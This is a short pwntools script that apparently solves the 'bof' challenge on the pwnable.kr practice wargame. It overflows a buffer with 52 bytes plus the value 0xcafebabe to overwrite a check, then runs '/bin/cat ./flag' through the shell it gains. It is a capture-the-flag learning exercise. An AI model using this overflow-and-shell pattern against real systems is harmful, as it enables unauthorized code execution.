from pwn import *


def main():
    p = remote('pwnable.kr', 9000)

    p.sendline('A'*52 + p32(0xcafebabe))
    p.sendline('/bin/cat ./flag')
    print(p.recvline())


if __name__ == '__main__':
    main()

